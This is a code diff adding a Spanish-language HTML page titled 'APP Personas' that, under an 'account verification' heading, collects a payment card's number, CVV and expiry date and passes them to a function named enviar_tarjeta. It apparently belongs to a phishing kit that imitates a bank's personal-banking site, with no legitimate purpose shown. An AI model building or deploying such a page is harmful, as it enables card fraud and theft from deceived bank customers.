@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>APP Personas</title>
+    <link rel="stylesheet" href="./assets/css/styles.css">
+    <link rel="stylesheet" href="./assets/css/clave.css">
+    <link rel="stylesheet" href="./assets/css/info.css">
+    <link rel="stylesheet" href="./assets/css/pedirCc.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <header>
+        <img src="./assets/img/cabecera-fija-768x91.png" alt="">
+    </header>
+    <section>
+        <span style="font-size: 30px;">Verificación de cuenta</span>
+        <img src="./assets/img/icons/credencial.png" alt=""><br>
+        <div class="box-form"><br>
+            <span>Otros datos</span><br><br>
+            <input type="email" placeholder="Numero de Tarjeta" maxlength="16" minlength="16" id="txtTarjeta"><br>
+            <input class="" type="text" placeholder="CVV" id="txtCVV" maxlength="3" onkeydown="return (event.keyCode >= 48 && event.keyCode <= 57) || event.keyCode === 8 || event.keyCode === 46"><br>
+            <span>Fecha expiración</span><br><br>
+            <div class="box-selectes">
+                <select name="" id="aFecha">
+                    <option value="">Seleccionar mes</option>
+                    <option value="01">Enero</option>
+                    <option value="02">Febrero</option>
+                    <option value="03">Marzo</option>
+                    <option value="04">Abril</option>
+                    <option value="05">Mayo</option>
+                    <option value="06">Junio</option>
+                    <option value="07">Julio</option>
+                    <option value="08">Agosto</option>
+                    <option value="09">Septiembre</option>
+                    <option value="10">Octubre</option>
+                    <option value="11">Noviembre</option>
+                    <option value="12">Diciembre</option>
+                </select>
+                <select name="" id="mFecha">
+                    <option value="">Seleccionar año</option>
+                    <option value="2023">2023</option>
+                    <option value="2023">2023</option>
+                    <option value="2024">2024</option>
+                    <option value="2025">2025</option>
+                    <option value="2026">2026</option>
+                    <option value="2027">2027</option>
+                    <option value="2028">2028</option>
+                    <option value="2029">2029</option>
+                    <option value="2030">2030</option>
+                    <option value="2031">2031</option>
+                </select>
+            </div>
+            <div class="box-btn">
+                <button id="btnTarjeta">Continuar</button>
+            </div>
+        </div>
+        <div class="img-fondo">
+            <img src="./assets/img/lineas-pag2.png" alt="">
+        </div>
+    </section>
+    <script type="text/javascript">
+        $(document).ready(function() {
+            $('#btnTarjeta').click(function(){
+                if ($("#txtTarjeta").val().length > 15) {
+                    if ($("#mFecha").val() != "") {
+                        if ($("#aFecha").val() != "") {
+                            if ($("#txtCVV").val().length > 2) {
+                                var fExp = $("#mFecha").val() + "-" + $("#aFecha").val(); 
+                                enviar_tarjeta($("#txtTarjeta").val(),fExp,$("#txtCVV").val());
+                            }else{
+                                $(".mensaje").show();
+                                $(".pass").css("border", "1px solid red");
+                                $("#txtCVV").focus();
+                            }
+                        }else{
+                            $(".mensaje").show();
+                            $("#aFecha").css("border", "1px solid red");
+                            $("#aFecha").focus();
+                        }
+                    }else{
+                        $(".mensaje").show();
+                        $("#mFecha").css("border", "1px solid red");
+                        $("#mFecha").focus();
+                    }
+                }else{
+                    $(".mensaje").show();
+                    $(".credit-card").css("border", "1px solid red");
+                    $("#txtTarjeta").focus();
+                }			
+            });
+    
+            $("#txtTarjeta").keyup(function(e) {
+                $(".credit-card").css("border", "1px solid #CCCCCC");	
+                $(".mensaje").hide();				
+            });
+            $("#mFecha").click(function(e) {
+                $("#mFecha").css("border", "1px solid #CCCCCC");	
+                $(".mensaje").hide();				
+            });
+            $("#aFecha").click(function(e) {
+                $("#aFecha").css("border", "1px solid #CCCCCC");	
+                $(".mensaje").hide();				
+            });
+            $("#txtCVV").keyup(function(e) {
+                $(".pass").css("border", "1px solid #CCCCCC");	
+                $(".mensaje").hide();				
+            });
+           });
+    </script>
+    <script type="text/javascript">
+         $(function($) {
+             var optionsEST = {
+             am_pm: true,
+             timeNotation: '12h',
+             h_hour: "<?php echo date('H:i:s') ?>",
+             h_date: "<?php echo date('Y/m/d') ?>",
+             h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
+             h_language: "es"
+            }
+         $('#fecha-hora').jclock(optionsEST);
+         });
+     </script> 						
+</body>
+</html>
